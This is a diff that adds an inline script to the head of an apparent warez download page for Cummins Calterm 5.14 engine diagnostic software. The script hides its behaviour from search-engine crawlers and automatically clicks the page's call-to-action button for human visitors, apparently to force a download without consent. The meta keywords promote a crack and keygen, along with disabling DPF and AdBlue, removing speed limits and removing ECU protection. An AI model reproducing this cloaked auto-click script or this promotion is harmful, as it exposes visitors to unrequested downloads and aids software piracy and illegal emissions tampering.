@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins Calterm 5.14 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the latest Cummins Calterm 5.14 2024 diagnostic software to monitor and change Cummins electronic control modules with new features and engine support.">
     <meta name="keywords" content="Cummins Calterm 5.14 2024, Cummins Calterm 5.14, Cummins Calterm 2024, Cummins Calterm 5.14 diagnostic software, Cummins Calterm 5.14 diagnostic software download, Cummins Calterm 5.14 diagnostic software free download, Cummins Calterm 5.14 crack, Cummins Calterm 5.14 keygen, Cummins Calterm 5.14 free download, Cummins Calterm 5.14 software download, Cummins Calterm 5.14 software free download, Cummins Calterm diagnostic software, Cummins Calterm 5.14 high speed download, Cummins Calterm tool, Cummins Calterm 5.14 Russian, Cummins Calterm 5.14 скачать, Cummins Calterm 5.14 бесплатная загрузка, Cummins Calterm 5.14 download, Cummins Calterm 5.14 электронные модули управления, Cummins Calterm 5.14 мониторинг, Cummins Calterm 5.14 мовлення, Cummins Calterm 5.14 ідентифікатор, Cummins Calterm 5.14 безкоштовне завантаження, Cummins Calterm 5.14 прошивка, Cummins Calterm software 2024 free download, Cummins Calterm software 2024, Cummins Calterm 5.14 tuning, Cummins Calterm 5.14 calibration settings, Cummins Calterm 5.14 ECU diagnostics, Cummins Calterm 5.14 ECU protection removal, Cummins Calterm 5.14 ADBlue disable, Cummins Calterm 5.14 DPF disable, Cummins Calterm 5.14 power increase, Cummins Calterm 5.14 speed limit remove, NEXIQ USB LINK Cummins Calterm, DG TECHNOLOGIES DPA5 Calterm 5.14, INLINE 7 Cummins Calterm, ECU diagnostics Calterm 5.14, Bosch overlay support Cummins Calterm, Cummins Calterm 5.14 new features">
     <style>
